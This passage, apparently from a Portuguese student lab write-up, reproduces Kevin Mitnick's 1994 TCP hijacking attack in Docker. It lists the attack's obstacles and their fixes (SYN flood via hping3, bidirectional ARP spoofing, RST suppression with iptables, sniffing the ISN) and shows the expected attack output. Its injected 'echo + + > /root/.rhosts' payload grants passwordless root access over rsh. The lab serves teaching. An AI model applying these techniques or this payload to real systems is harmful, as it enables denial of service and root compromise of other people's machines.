---

## 8. Desafios e Soluções

### Desafio 1: O servidor enviava RST e derrubava a sessão

**Problema:** Ao receber um SYN/ACK de uma conexão que nunca iniciou, o servidor confiável (`10.0.2.30`) enviava automaticamente um pacote RST ao alvo, encerrando a sessão antes que pudéssemos injetar o payload.

**Solução:** SYN Flood via `hping3 --flood --rand-source` na porta 514 do servidor. Com a backlog queue esgotada, o servidor não tem recursos para processar nem enviar RSTs. A configuração `net.ipv4.tcp_syncookies=0` no docker-compose garante que o servidor não use SYN cookies para contornar o flood.

### Desafio 2: ARP Race Condition

**Problema:** Enviar um único pacote ARP falso era insuficiente. O servidor real respondia com seu próprio ARP legítimo milissegundos depois, sobrescrevendo o envenenamento na tabela do alvo.

**Solução:** Usar o binário `arpspoof` em vez de um script manual. O `arpspoof` envia gratuitous ARP replies de forma contínua e em alta frequência em dois processos paralelos (bidirecional), vencendo consistentemente a corrida com o servidor real.

### Desafio 3: O kernel Linux bloqueava o IP Spoofing na Camada 3

**Problema:** Em alguns cenários, o kernel Linux descartava pacotes enviados com `socket.send()` quando o IP de origem não pertencia à interface local (rp_filter / reverse path filtering).

**Solução:** Construir os pacotes diretamente na Camada 2 com `Ether() / IP() / TCP()` e injetá-los com `sendp()`. Ao contornar a pilha de rede do kernel e escrever diretamente na interface, o rp_filter não é aplicado. Nota: na versão final, `send()` (Camada 3) foi suficiente devido à configuração do ambiente Docker, mas `sendp()` (Camada 2) seria a solução robusta para ambientes com rp_filter ativo.

### Desafio 4: ISN aleatório impossível de prever

**Problema:** Diferente de 1994, o kernel moderno gera ISNs criptograficamente aleatórios. Não é possível predizê-los.

**Solução:** Com o ARP Spoofing bidirecional ativo, o SYN/ACK do alvo (contendo o ISN) passa pelo atacante. O sniffer `tcpdump` captura esse pacote antes de encaminhá-lo, extraindo o ISN via regex e permitindo calcular os números de sequência corretos para o handshake.

### Desafio 5: O kernel do atacante enviava RST automático

**Problema:** Quando o SYN/ACK do alvo chegava ao atacante (via ARP Spoofing), o kernel do atacante via um pacote TCP inesperado e enviava automaticamente um RST, derrubando a sessão.

**Solução:** Regra `iptables` no início do script:
```
iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
```
Isso descarta todos os RSTs saindo do atacante, permitindo que a sessão forjada permaneça viva enquanto completamos o handshake e injetamos o payload.

---

## 9. Como Executar

### Pré-requisitos

- Docker e Docker Compose instalados
- Linux (o modo `privileged` e os `sysctls` do docker-compose requerem Linux)

### Passo a Passo

```bash
# 1. Subir o ambiente
cd student-environment
docker-compose up -d --build

# 2. Verificar que todos os containers estão rodando
docker-compose ps

# 3. Acessar o container do atacante
docker exec -it attacker bash

# 4. Dentro do container, executar o ataque
cd /app
python3 main.py
```

### Saída Esperada

```
--- Starting Mitnick Attack ---
[+] Blocking outgoing RST packets to prevent kernel interference.
[+] Running: iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP

[Step 1] DoS attack running in the background.
Starting SYN flood attack on 10.0.2.30:514
DoS attack started.

[Step 2] Bidirectional ARP spoofing running in the background.
[+] Starting bidirectional arpspoof between 10.0.2.20 and 10.0.2.30

[Step 3] Starting network sniffer...
--- Sniffing for SYN/ACK using tcpdump ---
[+] Running tcpdump with filter: "src host 10.0.2.20 and ..."

[Step 4] Sending spoofed SYN packet...
--- Sending Spoofed SYN Packet ---
[+] Spoofed SYN sent with ISN: 123456789

[+] Captured SYN/ACK packet. Target's ISN is: 2847361920

[+] Success! Captured Target ISN: 2847361920

--- Completing Handshake and Injecting Payload ---
[+] Spoofed ACK sent (seq=123456790, ack=2847361921). Connection established!
[+] Payload injected: 'echo + + > /root/.rhosts'

[+] Attack payload injected. Check the target's /.rhosts file.
Type "exit" to stop background processes and terminate.
```

---

## 10. Verificação do Resultado

### 10.1 Verificar o conteúdo do `.rhosts`

```bash
# De qualquer container na rede
docker exec target cat /root/.rhosts
```

**Antes do ataque:**
```
10.0.2.30 root
```

**Após o ataque:**
```
10.0.2.30 root
+ +
```

A entrada `+ +` significa "aceitar qualquer usuário de qualquer host" — backdoor root total.

### 10.2 Verificar acesso root sem senha

```bash
# Do container atacante (ou de qualquer outro host na rede)
docker exec -it attacker bash
rsh 10.0.2.20 whoami
# saída: root

rsh 10.0.2.20 ls -la /root/
# lista os arquivos do diretório root do alvo sem pedir senha
```

### 10.3 Monitorar o tráfego em tempo real (opcional)

```bash
# Em um terminal separado, antes de iniciar o ataque
docker exec target tcpdump -i eth0 -n port 514
```

---

## 11. Referências

- **Shimomura, T. & Markoff, J.** — *Takedown: The Pursuit and Capture of Kevin Mitnick* (1996) — Relato detalhado do ataque original de 1994.
- **Stevens, W. R.** — *TCP/IP Illustrated, Volume 1: The Protocols* — Referência completa para SYN/ACK, ISN e three-way handshake.
- **RFC 1282** — *BSD Rlogin* — Especificação do protocolo RSH/RLOGIN e o formato de payload com null bytes.
- **Scapy Documentation** — [scapy.net](https://scapy.net/) — Construção de pacotes em Python.
- **hping3 man page** — Documentação do `hping3` para SYN flood e IP spoofing.
- **dsniff / arpspoof** — [monkey.org/~dugsong/dsniff](http://monkey.org/~dugsong/dsniff/) — Suite de ferramentas de rede incluindo `arpspoof`.
- **Phrack Magazine, Issue 46, Article 14** — *IP-spoofing Demystified* (1994) — Artigo técnico contemporâneo ao ataque de Mitnick sobre as técnicas de spoofing utilizadas.
